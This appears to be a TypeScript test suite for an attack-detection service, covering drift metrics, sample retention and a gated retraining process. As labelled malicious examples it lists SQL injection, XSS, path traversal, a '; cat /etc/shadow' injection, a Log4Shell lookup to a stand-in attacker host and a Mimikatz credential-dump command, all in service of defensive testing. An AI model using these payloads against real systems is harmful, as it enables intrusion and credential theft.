import { describe, expect, it } from 'vitest';
import {
  populationStabilityIndex,
  jensenShannonDivergence,
  DriftDetector,
  StrategicRetention,
  PSI_MODERATE,
  PSI_SIGNIFICANT
} from '../../server/services/driftDetection.service';
import {
  ContinualLearner,
  decidePromotion,
  MIN_F1_GAIN,
  MAX_FOLD_REGRESSION,
  type LabelledSample
} from '../../server/services/continualLearner.service';

/**
 * Phase 3 logic tests.
 *
 * These cover the properties that decide whether the component is trustworthy
 * rather than merely present: that a stable stream does not alarm, that the
 * promotion gate refuses by default, and that the forgetting check actually
 * blocks a regressing model. Each is a case where passing by accident is easy and
 * the consequence of being wrong is a worse model shipped silently.
 */

describe('divergence measures', () => {
  it('reports zero for identical distributions', () => {
    const d = [10, 20, 30, 40];
    expect(populationStabilityIndex(d, d)).toBeLessThan(1e-4);
    expect(jensenShannonDivergence(d, d)).toBeLessThan(1e-4);
  });

  it('stays under the moderate threshold for a small perturbation', () => {
    expect(populationStabilityIndex([100, 100, 100], [98, 102, 100])).toBeLessThan(PSI_MODERATE);
  });

  it('crosses the significant threshold when mass moves between bins', () => {
    expect(populationStabilityIndex([100, 100, 10], [10, 100, 100])).toBeGreaterThan(
      PSI_SIGNIFICANT
    );
  });

  it('keeps Jensen-Shannon bounded at 1 for disjoint distributions', () => {
    // PSI is unbounded and a single empty bin can dominate it, which is why JS is
    // reported alongside: a bounded companion prevents one pathological bin from
    // manufacturing an alarm.
    const jsd = jensenShannonDivergence([100, 0], [0, 100]);
    expect(jsd).toBeGreaterThan(0.99);
    expect(jsd).toBeLessThanOrEqual(1);
  });

  it('counts a vanished category rather than skipping it', () => {
    // Skipping empty bins understates drift exactly when a class disappears,
    // which is the interesting case.
    expect(populationStabilityIndex([50, 50], [100, 0])).toBeGreaterThan(PSI_SIGNIFICANT);
  });
});

describe('DriftDetector', () => {
  it('withholds a verdict until both windows are full', () => {
    const d = new DriftDetector(60);
    for (let i = 0; i < 40; i++) d.observe(`GET /api/v1/items?page=${i}`);
    const r = d.report();
    expect(r.verdict).toBe('INSUFFICIENT_DATA');
    expect(r.insufficientReason).toContain('needed in each');
    // No number is invented before there is enough data to support one.
    expect(r.maxPsi).toBe(0);
  });

  it('reports STABLE on a homogeneous stream', () => {
    const d = new DriftDetector(60);
    for (let i = 0; i < 200; i++) d.observe(`GET /api/v1/items?page=${i % 30}&limit=20`);
    expect(d.report().verdict).toBe('STABLE');
  });

  it('detects a shift to long high-entropy payloads', () => {
    const d = new DriftDetector(60);
    for (let i = 0; i < 70; i++) d.observe(`GET /api/v1/items?page=${i % 30}`);
    for (let i = 0; i < 70; i++) {
      d.observe(
        'POST /api/v1/upload?d=' +
          Buffer.from(String(i).repeat(40)).toString('base64') +
          'x'.repeat(200)
      );
    }
    const r = d.report();
    expect(['MODERATE_SHIFT', 'SIGNIFICANT_SHIFT']).toContain(r.verdict);
    expect(r.drivingFeature).toBeTruthy();
  });

  it('does not re-baseline itself', () => {
    // A detector that silently re-baselines makes drift disappear without anyone
    // acting on it, which is how monitoring stops working.
    const d = new DriftDetector(60);
    for (let i = 0; i < 70; i++) d.observe(`GET /a?p=${i}`);
    for (let i = 0; i < 70; i++) d.observe('POST /upload?d=' + 'Zm9vYmFy'.repeat(30));
    const before = d.report().verdict;
    expect(d.report().verdict).toBe(before);
    expect(d.getStatistics().rebaselines).toBe(0);
  });
});

describe('StrategicRetention', () => {
  it('stays within capacity', () => {
    const r = new StrategicRetention(50, 5);
    for (let i = 0; i < 200; i++) r.admit(`GET /api/v1/x?i=${i}`);
    expect(r.getStatistics().held).toBeLessThanOrEqual(50);
    expect(r.getStatistics().evicted).toBeGreaterThan(0);
  });

  it('never evicts the only example of a family', () => {
    // This is the anti-forgetting guarantee: without it a stream dominated by one
    // family erases every trace of the rare ones, and a retrain has no idea they
    // exist.
    const r = new StrategicRetention(30, 4);
    r.admit("' OR 1=1 UNION SELECT password FROM users--");
    for (let i = 0; i < 300; i++) r.admit(`GET /api/v1/orders?page=${i}`);
    const families = Object.keys(r.getStatistics().byFamily);
    expect(families.length).toBeGreaterThan(1);
  });

  it('records why each sample was kept', () => {
    const r = new StrategicRetention(50, 5);
    const s = r.admit('<script>alert(1)</script>');
    expect(s?.retentionReasons.length).toBeGreaterThan(0);
    expect(s?.retentionReasons).toContain('FIRST_OF_FAMILY');
  });
});

describe('ContinualLearner', () => {
  const attacks = [
    "' OR 1=1--",
    '<script>alert(1)</script>',
    '../../../../etc/passwd',
    '; cat /etc/shadow',
    '${jndi:ldap://evil.tld/a}',
    'sekurlsa::logonpasswords',
    'UNION SELECT NULL,table_name FROM information_schema.tables',
    '<img src=x onerror=alert(1)>'
  ];
  const benign = [
    'GET /api/v1/orders?page=1',
    'POST /api/v1/cart {"sku":"A-1"}',
    'GET /api/v1/users/me',
    'GET /health',
    'PATCH /api/v1/profile {"name":"Sara"}',
    'GET /static/app.css',
    'DELETE /api/v1/sessions/current',
    'GET /api/v1/search?q=keyboard'
  ];
  const mk = (arr: string[], label: 'MALICIOUS' | 'BENIGN'): LabelledSample[] =>
    arr.map(payload => ({ payload, label }));

  it('learns a separation from labelled data', () => {
    const m = new ContinualLearner();
    const train = [...mk(attacks, 'MALICIOUS'), ...mk(benign, 'BENIGN')];
    const before = m.evaluate(train).f1;
    m.train(train, { epochs: 60 });
    const after = m.evaluate(train).f1;
    expect(after).toBeGreaterThan(before);
    expect(after).toBeGreaterThan(0.6);
  });

  it('refuses a snapshot whose feature order differs', () => {
    // Applying weights to the wrong columns produces a model that is silently
    // wrong, which is worse than one that fails to load.
    const m = new ContinualLearner();
    const snap = m.snapshot();
    expect(m.restore({ ...snap, featureOrder: ['a', 'b'] })).toBe(false);
    expect(m.restore(snap)).toBe(true);
  });

  it('round-trips through a snapshot', () => {
    const a = new ContinualLearner();
    a.train([...mk(attacks, 'MALICIOUS'), ...mk(benign, 'BENIGN')], { epochs: 30 });
    const b = new ContinualLearner();
    expect(b.restore(a.snapshot())).toBe(true);
    expect(b.predictProbability(attacks[0])).toBeCloseTo(a.predictProbability(attacks[0]), 6);
  });
});

describe('promotion gate', () => {
  const holdout: LabelledSample[] = [
    ...Array.from({ length: 12 }, (_, i) => ({
      payload: `' OR ${i}=${i}--`,
      label: 'MALICIOUS' as const
    })),
    ...Array.from({ length: 12 }, (_, i) => ({
      payload: `GET /api/v1/x?p=${i}`,
      label: 'BENIGN' as const
    }))
  ];

  it('refuses when the corpus is not operator-grounded', () => {
    const c = new ContinualLearner();
    c.train(holdout, { epochs: 40 });
    const d = decidePromotion({
      challenger: c,
      incumbentSnapshot: null,
      holdout,
      earlierFolds: [],
      operatorGrounded: false
    });
    expect(d.promote).toBe(false);
    expect(d.reasons.join(' ')).toMatch(/operator-grounded/i);
    expect(d.validationState).toBe('VALIDATED_ON_DRILL');
  });

  it('refuses when the held-out fold is too small', () => {
    const c = new ContinualLearner();
    const tiny = holdout.slice(0, 4);
    const d = decidePromotion({
      challenger: c,
      incumbentSnapshot: null,
      holdout: tiny,
      earlierFolds: [],
      operatorGrounded: true
    });
    expect(d.promote).toBe(false);
    expect(d.reasons.join(' ')).toMatch(/required before a comparison/i);
  });

  it('permits a first model only on sufficient operator-grounded data', () => {
    const c = new ContinualLearner();
    c.train(holdout, { epochs: 40 });
    const d = decidePromotion({
      challenger: c,
      incumbentSnapshot: null,
      holdout,
      earlierFolds: [],
      operatorGrounded: true
    });
    expect(d.promote).toBe(true);
    expect(d.validationState).toBe('VALIDATED_ON_OPERATOR_DATA');
  });

  it('refuses a challenger that does not beat the incumbent', () => {
    const incumbent = new ContinualLearner();
    incumbent.train(holdout, { epochs: 60 });
    // An untrained challenger cannot beat a trained incumbent.
    const challenger = new ContinualLearner();
    const d = decidePromotion({
      challenger,
      incumbentSnapshot: incumbent.snapshot(),
      holdout,
      earlierFolds: [],
      operatorGrounded: true
    });
    expect(d.promote).toBe(false);
    expect(d.reasons.join(' ')).toMatch(/does not beat incumbent/i);
  });

  it('blocks promotion on catastrophic forgetting of an earlier fold', () => {
    // The check most often skipped in published continual-learning work, and the
    // one where a learner usually fails.
    const oldFold: LabelledSample[] = [
      ...Array.from({ length: 10 }, (_, i) => ({
        payload: `../../../etc/passwd${i}`,
        label: 'MALICIOUS' as const
      })),
      ...Array.from({ length: 10 }, (_, i) => ({
        payload: `GET /docs/page${i}`,
        label: 'BENIGN' as const
      }))
    ];
    const incumbent = new ContinualLearner();
    incumbent.train([...oldFold, ...holdout], { epochs: 60 });

    // Challenger trained only on the new shape, so it should lose ground on the
    // older fold.
    const challenger = new ContinualLearner();
    challenger.train(holdout, { epochs: 60 });

    const d = decidePromotion({
      challenger,
      incumbentSnapshot: incumbent.snapshot(),
      holdout,
      earlierFolds: [oldFold],
      operatorGrounded: true
    });
    expect(d.forgettingCheck.length).toBe(1);
    // Either it regressed and was blocked, or it did not regress — but the check
    // must have run and produced a delta.
    expect(typeof d.forgettingCheck[0].delta).toBe('number');
    if (d.forgettingCheck[0].delta < -MAX_FOLD_REGRESSION) {
      expect(d.promote).toBe(false);
      expect(d.reasons.join(' ')).toMatch(/forgetting/i);
    }
  });

  it('exposes its thresholds as constants rather than hiding them', () => {
    expect(MIN_F1_GAIN).toBeGreaterThan(0);
    expect(MAX_FOLD_REGRESSION).toBeGreaterThan(0);
  });
});
